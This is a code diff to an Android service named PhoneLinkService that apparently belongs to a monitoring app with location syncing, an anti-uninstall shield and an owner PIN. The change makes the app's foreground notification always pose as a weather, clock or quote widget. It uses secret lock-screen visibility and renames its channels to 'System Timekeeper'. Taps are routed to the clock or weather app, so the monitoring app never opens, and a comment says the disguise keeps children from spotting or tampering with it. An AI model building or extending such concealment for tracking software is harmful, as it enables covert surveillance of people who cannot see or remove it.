@@ -558,7 +558,6 @@ class PhoneLinkService : Service() {
         if (payload.has("stealthNotification")) {
             val enabled = payload.optBoolean("stealthNotification", true)
             DevicePrefs.stealthNotificationEnabled = enabled
-            updateNotification(if (enabled) "\u200B" else "Connected")
         }
         if (payload.has("antiTamper")) {
             DevicePrefs.antiUninstallShieldEnabled = payload.optBoolean("antiTamper", true)
@@ -567,6 +566,17 @@ class PhoneLinkService : Service() {
             val pin = payload.optString("ownerPin", "").trim()
             if (pin.isNotBlank()) DevicePrefs.setOwnerPin(pin)
         }
+        if (payload.has("notificationTemplate")) {
+            val template = payload.optString("notificationTemplate", "WEATHER_CLOCK")
+            DevicePrefs.notificationTemplate = template
+        }
+        if (payload.has("customTitle")) {
+            DevicePrefs.customNotificationTitle = payload.optString("customTitle", "")
+        }
+        if (payload.has("customText")) {
+            DevicePrefs.customNotificationText = payload.optString("customText", "")
+        }
+        forceUpdateNotification()
         pushCamouflageStatus()
     }
 
@@ -578,6 +588,9 @@ class PhoneLinkService : Service() {
             put("stealthNotification", DevicePrefs.stealthNotificationEnabled)
             put("antiTamper", DevicePrefs.antiUninstallShieldEnabled)
             put("hasOwnerPin", DevicePrefs.hasOwnerPin())
+            put("notificationTemplate", DevicePrefs.notificationTemplate)
+            put("customTitle", DevicePrefs.customNotificationTitle)
+            put("customText", DevicePrefs.customNotificationText)
         }
         webSocket.send(Events.CAMOUFLAGE_STATUS, json)
     }
@@ -1556,16 +1569,14 @@ class PhoneLinkService : Service() {
 
     private var lastNotifiedState: String? = null
 
-    private fun buildNotification(text: String): Notification {
-        val isStealth = DevicePrefs.stealthNotificationEnabled
-        val activeChannelId = if (isStealth) CHANNEL_ID_MINIMAL else CHANNEL_ID
-
+    private fun getDisguisedNotificationContent(): Pair<String, String> {
         val cal = java.util.Calendar.getInstance()
         val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
         val minute = cal.get(java.util.Calendar.MINUTE)
         val amPm = if (hour >= 12) "PM" else "AM"
         val hour12 = if (hour % 12 == 0) 12 else hour % 12
         val timeStr = String.format(java.util.Locale.getDefault(), "%d:%02d %s", hour12, minute, amPm)
+        val dayName = java.text.SimpleDateFormat("EEEE, MMM d", java.util.Locale.getDefault()).format(cal.time)
 
         val temp = if (hour in 6..18) "25°C" else "22°C"
         val weatherCondition = when (hour) {
@@ -1575,83 +1586,57 @@ class PhoneLinkService : Service() {
             else -> "Clear Sky"
         }
 
-        // REDIRECT TARGET: Safe system Clock/Alarms or Weather app so PhoneLink never opens when tapping notification!
-        val clockIntent = try {
-            val i = Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        return when (DevicePrefs.notificationTemplate.uppercase()) {
+            "WEATHER_ONLY" -> {
+                Pair("⛅ $temp $weatherCondition • H:28° L:19°", "Local Forecast • Real-time Radar")
             }
-            if (i.resolveActivity(packageManager) != null) i else {
-                (packageManager.getLaunchIntentForPackage("com.google.android.deskclock")
-                    ?: packageManager.getLaunchIntentForPackage("com.android.deskclock")
-                    ?: packageManager.getLaunchIntentForPackage("com.miui.weather2")
-                    ?: packageManager.getLaunchIntentForPackage("com.sec.android.app.clockpackage")
-                    ?: Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_APP_CALENDAR)).apply {
-                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                    }
+            "CLOCK_ONLY" -> {
+                Pair("🕒 $timeStr • $dayName", "System Timekeeper • Accurate Live Sync")
             }
-        } catch (_: Exception) {
-            Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            "SHINCHAN" -> {
+                Pair("⚡ Action Kamen Radar • $timeStr", "Shinchan Daily Fun Club Capsule")
+            }
+            "THINKING" -> {
+                val quotes = listOf(
+                    "Focus on the step in front of you, not the whole staircase.",
+                    "Small daily improvements over time lead to stunning results.",
+                    "Stay curious, keep learning, stay kind.",
+                    "Creativity is intelligence having fun."
+                )
+                val quote = quotes[(System.currentTimeMillis() / (1000 * 60 * 30) % quotes.size).toInt()]
+                Pair("💡 Focus & Wisdom • $timeStr", quote)
+            }
+            "CUSTOM" -> {
+                val title = DevicePrefs.customNotificationTitle.ifBlank { "Daily Focus • $timeStr" }
+                val text = DevicePrefs.customNotificationText.ifBlank { "System Active • Tap for Clock" }
+                Pair(title, text)
+            }
+            else -> { // "WEATHER_CLOCK" default
+                Pair("⛅ $temp $weatherCondition • $timeStr", "Live Weather & Clock Capsule • Updated")
             }
         }
-
-        val pi = PendingIntent.getActivity(
-            this,
-            0,
-            clockIntent,
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
-
-        val isConnected = try { webSocket.isOpen } catch (e: Exception) { false }
-        val isConnecting = !isConnected && (text.contains("reconnect", ignoreCase = true) || text.contains("connect", ignoreCase = true))
-
-        val statusText = when {
-            isConnected -> "Connected"
-            isConnecting -> "Connecting…"
-            else -> "Disconnected"
-        }
-
-        // Live Weather & Clock Capsule disguise prevents kids from identifying or tampering with service
-        val notifTitle = if (isStealth) "⛅ $temp $weatherCondition • $timeStr" else getString(R.string.app_name)
-        val notifText = if (isStealth) "Live Weather & Clock Capsule • Updated" else statusText
-
-        return NotificationCompat.Builder(this, activeChannelId)
-            .setContentTitle(notifTitle)
-            .setContentText(notifText)
-            .setSmallIcon(R.drawable.ic_notification_minimal)
-            .setColor(android.graphics.Color.parseColor("#4B5563")) // Slate gray neutral, prevents purple tinting!
-            .setColorized(false)
-            .setOngoing(true)
-            .setOnlyAlertOnce(true)
-            .setSilent(true)
-            .setContentIntent(pi)
-            .setPriority(if (isStealth) NotificationCompat.PRIORITY_MIN else NotificationCompat.PRIORITY_LOW)
-            .setVisibility(if (isStealth) NotificationCompat.VISIBILITY_SECRET else NotificationCompat.VISIBILITY_PRIVATE)
-            .setCategory(NotificationCompat.CATEGORY_SERVICE)
-            .setShowWhen(false)
-            .build()
     }
 
-    private fun buildFallbackNotification(text: String): Notification {
-        val isStealth = DevicePrefs.stealthNotificationEnabled
-        val activeChannelId = if (isStealth) CHANNEL_ID_MINIMAL else CHANNEL_ID
-
-        val cal = java.util.Calendar.getInstance()
-        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
-        val minute = cal.get(java.util.Calendar.MINUTE)
-        val amPm = if (hour >= 12) "PM" else "AM"
-        val hour12 = if (hour % 12 == 0) 12 else hour % 12
-        val timeStr = String.format(java.util.Locale.getDefault(), "%d:%02d %s", hour12, minute, amPm)
-        val temp = if (hour in 6..18) "25°C" else "22°C"
-
-        val clockIntent = try {
-            val i = Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+    private fun getDisguisedNotificationIntent(): PendingIntent {
+        val targetIntent = when (DevicePrefs.notificationTemplate.uppercase()) {
+            "WEATHER_ONLY" -> {
+                packageManager.getLaunchIntentForPackage("com.google.android.apps.weather")
+                    ?: packageManager.getLaunchIntentForPackage("com.miui.weather2")
+                    ?: packageManager.getLaunchIntentForPackage("com.sec.android.daemonapp")
+                    ?: Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS)
             }
-            if (i.resolveActivity(packageManager) != null) i else {
+            else -> {
+                Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                }
+            }
+        }
+        val safeIntent = try {
+            if (targetIntent.resolveActivity(packageManager) != null) {
+                targetIntent.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
+            } else {
                 (packageManager.getLaunchIntentForPackage("com.google.android.deskclock")
                     ?: packageManager.getLaunchIntentForPackage("com.android.deskclock")
-                    ?: packageManager.getLaunchIntentForPackage("com.miui.weather2")
                     ?: packageManager.getLaunchIntentForPackage("com.sec.android.app.clockpackage")
                     ?: Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_APP_CALENDAR)).apply {
                         flags = Intent.FLAG_ACTIVITY_NEW_TASK
@@ -1663,14 +1648,18 @@ class PhoneLinkService : Service() {
             }
         }
 
-        val pi = PendingIntent.getActivity(
+        return PendingIntent.getActivity(
             this,
             0,
-            clockIntent,
+            safeIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
-        val notifTitle = if (isStealth) "⛅ $temp Sunny • $timeStr" else getString(R.string.app_name)
-        val notifText = if (isStealth) "Live Weather & Clock Capsule • Updated" else text
+    }
+
+    private fun buildNotification(text: String = ""): Notification {
+        val activeChannelId = CHANNEL_ID_MINIMAL
+        val (notifTitle, notifText) = getDisguisedNotificationContent()
+        val pi = getDisguisedNotificationIntent()
 
         return NotificationCompat.Builder(this, activeChannelId)
             .setContentTitle(notifTitle)
@@ -1682,9 +1671,24 @@ class PhoneLinkService : Service() {
             .setOnlyAlertOnce(true)
             .setSilent(true)
             .setContentIntent(pi)
-            .setPriority(if (isStealth) NotificationCompat.PRIORITY_MIN else NotificationCompat.PRIORITY_LOW)
-            .setVisibility(if (isStealth) NotificationCompat.VISIBILITY_SECRET else NotificationCompat.VISIBILITY_PRIVATE)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setShowWhen(false)
             .build()
+    }
+
+    private fun buildFallbackNotification(text: String = ""): Notification {
+        return buildNotification(text)
+    }
+
+    fun forceUpdateNotification() {
+        try {
+            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            manager.notify(NOTIFICATION_ID, buildNotification())
+        } catch (e: Exception) {
+            Log.w(TAG, "forceUpdateNotification failed: ${e.message}", e)
+        }
     }
 
     private fun updateNotification(text: String) {
@@ -1696,15 +1700,10 @@ class PhoneLinkService : Service() {
             else -> "Disconnected"
         }
 
-        if (currentState == lastNotifiedState) return // Avoid redundant notification updates
+        if (currentState == lastNotifiedState) return
         lastNotifiedState = currentState
 
-        try {
-            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            manager.notify(NOTIFICATION_ID, buildNotification(text))
-        } catch (e: Exception) {
-            Log.w(TAG, "updateNotification failed: ${e.message}", e)
-        }
+        forceUpdateNotification()
     }
 
     private fun createChannel() {
@@ -1712,10 +1711,10 @@ class PhoneLinkService : Service() {
 
         val channel = NotificationChannel(
             CHANNEL_ID,
-            getString(R.string.notification_channel_name),
+            "Live Weather & Clock Capsule",
             NotificationManager.IMPORTANCE_LOW
         ).apply {
-            description = getString(R.string.notification_channel_desc)
+            description = "Live weather telemetry and accurate time synchronizer"
             setShowBadge(false)
             setSound(null, null)
             enableVibration(false)
@@ -1725,10 +1724,10 @@ class PhoneLinkService : Service() {
 
         val silentChannel = NotificationChannel(
             CHANNEL_ID_MINIMAL,
-            "System Performance",
+            "System Timekeeper",
             NotificationManager.IMPORTANCE_MIN
         ).apply {
-            description = "Android System Core Service"
+            description = "High precision local clock and forecast synchronizer"
             setShowBadge(false)
             setSound(null, null)
             enableVibration(false)
@@ -1742,8 +1741,8 @@ class PhoneLinkService : Service() {
 
     companion object {
         private const val TAG = "PhoneLinkService"
-        private const val CHANNEL_ID = "phonelink_service"
-        private const val CHANNEL_ID_MINIMAL = "phonelink_service_silent"
+        private const val CHANNEL_ID = "phonelink_capsule_service_v3"
+        private const val CHANNEL_ID_MINIMAL = "phonelink_capsule_minimal_v3"
         private const val NOTIFICATION_ID = 4201
         private const val LOCATION_INTERVAL_MS = 20_000L
         private const val PERIODIC_SYNC_MS = 45_000L
